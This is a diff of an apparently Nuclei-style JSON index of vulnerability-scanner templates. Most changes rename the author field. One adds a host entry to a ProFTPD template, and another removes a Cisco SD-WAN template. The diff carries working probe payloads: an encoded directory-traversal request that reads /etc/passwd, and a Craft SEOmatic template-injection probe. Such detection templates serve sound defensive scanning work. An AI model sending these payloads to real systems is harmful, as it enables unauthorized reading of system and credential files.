@@ -469,7 +469,7 @@
     {
       "id": "CVE-2015-3306",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "description": "The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.",
         "name": "ProFTPd RCE",
         "reference": "https://github.com/t0kx/exploit-CVE-2015-3306",
@@ -479,7 +479,8 @@
       "network": [
         {
           "host": [
-            "{{Hostname}}:21"
+            "{{Hostname}}:21",
+            "{{Hostname}}"
           ],
           "inputs": [
             {
@@ -1427,7 +1428,7 @@
     {
       "id": "CVE-2017-9506",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "description": "The IconUriServlet of the Atlassian OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4 allows remote attackers to access the content of internal network resources and/or perform an XSS attack via Server Side Request Forgery (SSRF).",
         "name": "Jira IconURIServlet SSRF",
         "severity": "high",
@@ -2715,7 +2716,7 @@
     {
       "id": "CVE-2018-7251",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "name": "AnchorCMS Error Log Exposure",
         "severity": "medium",
         "tags": "cve,cve2018,anchorcms,logs"
@@ -2852,7 +2853,7 @@
     {
       "id": "CVE-2018-8006",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "name": "Apache ActiveMQ XSS",
         "severity": "medium",
         "tags": "cve,cve2018,apache,activemq,xss"
@@ -2989,7 +2990,7 @@
     {
       "id": "CVE-2019-10092",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "description": "In Apache HTTP Server 2.4.0-2.4.39, a limited cross-site scripting issue was reported affecting the mod_proxy error page. An attacker could cause the link on the error page to be malformed and instead point to a page of their choice. This would only be exploitable where a server was set up with proxying enabled but was misconfigured in such a way that the Proxy Error page was displayed.",
         "name": "Apache mod_proxy HTML Injection / Partial XSS",
         "reference": "- https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2019-10092-Limited%20Cross-Site%20Scripting%20in%20mod_proxy%20Error%20Page-Apache%20httpd\n- https://httpd.apache.org/security/vulnerabilities_24.html\n",
@@ -3465,7 +3466,7 @@
     {
       "id": "CVE-2019-14223",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "description": "An issue was discovered in Alfresco Community Edition versions below 5.2.6, 6.0.N and 6.1.N. The Alfresco Share application is vulnerable to an Open Redirect attack via a crafted POST request. By manipulating the POST parameters, an attacker can redirect a victim to a malicious website over any protocol the attacker desires (e.g.,http, https, ftp, smb, etc.).",
         "name": "Alfresco Share Open Redirect",
         "reference": "- https://community.alfresco.com/content?filterID=all~objecttype~thread%5Bquestions%5D\n- https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2019-14223-Open%20Redirect%20in%20Alfresco%20Share-Alfresco%20Community\n",
@@ -4721,7 +4722,7 @@
     {
       "id": "CVE-2019-7219",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "description": "Unauthenticated reflected cross-site scripting (XSS) exists in Zarafa Webapp 2.0.1.47791 and earlier. NOTE: this is a discontinued product. The issue was fixed in later Zarafa Webapp versions; however, some former Zarafa Webapp customers use the related Kopano product instead.\n",
         "name": "Zarafa WebApp Reflected XSS",
         "reference": "- https://github.com/verifysecurity/CVE-2019-7219\n- https://stash.kopano.io/repos?visibility=public\n",
@@ -5115,7 +5116,7 @@
     {
       "id": "CVE-2019-9955",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "description": "On Zyxel ATP200, ATP500, ATP800, USG20-VPN, USG20W-VPN, USG40, USG40W, USG60, USG60W, USG110, USG210, USG310, USG1100, USG1900, USG2200-VPN, ZyWALL 110, ZyWALL 310, ZyWALL 1100 devices, the security firewall login page is vulnerable to Reflected XSS via the unsanitized 'mp_idx' parameter.",
         "name": "CVE-2019-9955 Zyxel XSS",
         "reference": "http://packetstormsecurity.com/files/152525/Zyxel-ZyWall-Cross-Site-Scripting.html\nhttp://seclists.org/fulldisclosure/2019/Apr/22\nhttps://www.exploit-db.com/exploits/46706/\nhttps://www.securitymetrics.com/blog/Zyxel-Devices-Vulnerable-Cross-Site-Scripting-Login-page\nhttps://www.zyxel.com/support/reflected-cross-site-scripting-vulnerability-of-firewalls.shtml\n",
@@ -6716,7 +6717,7 @@
     {
       "id": "CVE-2020-17518",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "description": "Apache Flink 1.5.1 introduced a REST handler that allows you to write an uploaded file to an arbitrary location on the local file system,\nthrough a maliciously modified HTTP HEADER.\n",
         "name": "Apache Flink Upload Path Traversal",
         "reference": "https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518",
@@ -6748,7 +6749,7 @@
     {
       "id": "CVE-2020-17519",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "description": "A change introduced in Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process.",
         "name": "Apache Flink directory traversal",
         "reference": "https://github.com/B1anda0/CVE-2020-17519",
@@ -6812,7 +6813,7 @@
     {
       "id": "CVE-2020-1943",
       "info": {
-        "author": "pd-team",
+        "author": "pdteam",
         "description": "Data sent with contentId to /control/stream is not sanitized, allowing XSS attacks in Apache OFBiz 16.11.01 to 16.11.07.",
         "name": "Apache OFBiz Reflected XSS",
         "reference": [
@@ -9321,41 +9322,6 @@
           "path": [
             "{{BaseURL}}/actions/seomatic/meta-container/meta-link-container/?uri={{228*'98'}}",
             "{{BaseURL}}/actions/seomatic/meta-container/all-meta-containers?uri={{228*'98'}}"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "CVE-2020-26073",
-      "info": {
-        "author": "madrobot",
-        "description": "A vulnerability in the application data endpoints of Cisco SD-WAN vManage Software could allow an unauthenticated, remote attacker to gain access to sensitive information.\n\nThe vulnerability is due to improper validation of directory traversal character sequences within requests to application programmatic interfaces (APIs). An attacker could exploit this vulnerability by sending malicious requests to an API within the affected application. A successful exploit could allow the attacker to conduct directory traversal attacks and gain access to sensitive information including credentials or user tokens.\n",
-        "name": "Cisco SD-WAN vManage Software Directory Traversal",
-        "reference": "https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-vman-traversal-hQh24tmk.html",
-        "severity": "high",
-        "tags": "lfi,cve,cve2020,cisco"
-      },
-      "requests": [
-        {
-          "matchers": [
-            {
-              "status": [
-                200
-              ],
-              "type": "status"
-            },
-            {
-              "part": "body",
-              "type": "regex",
-              "words": [
-                "root:[x*]:0:0:"
-              ]
-            }
-          ],
-          "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd"
           ]
         }
       ]
